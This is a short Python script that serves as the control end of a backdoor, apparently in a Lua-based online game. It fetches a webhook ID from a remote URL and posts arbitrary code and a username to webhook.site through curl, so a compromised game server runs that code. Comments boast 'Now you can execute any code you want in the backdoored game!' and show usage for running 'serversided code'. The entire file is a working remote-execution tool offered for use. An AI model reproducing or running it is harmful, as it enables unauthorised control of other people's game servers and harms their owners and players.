import json, subprocess
from time import sleep as wait

dataSourceUrl = None

def setup(url):
    global dataSourceUrl
    dataSourceUrl = url

def send(string, url):
    subprocess.run([
        'curl',
        '-H', 'Content-Type: application/json',
        '-d', 
        string,
        url
    ], text=True, capture_output=True)

def loadstring(code, username):
    webhookID = subprocess.run(
        ['curl', '-s', dataSourceUrl],
        text=True,
        capture_output=True
    ).stdout

    webhookID = json.loads(webhookID)["webhookid"]

    webhookURL = "https://webhook.site/" + webhookID

    payload = json.dumps({
        'code': code,
        'username': username
    })

    send(payload, webhookURL)

    wait(0.45)

    payload = json.dumps({
        'code': "",
        'username': ""
    })

    send(payload, webhookURL)

# Now you can execute any code you want in the backdoored game!

"""

setup("A link with the data in it") # Please make note that you should have the JSON in the correct format and it must be the same link as the lua file
loadstring("print('hi')", "J45K7") # Execute any serversided code

"""
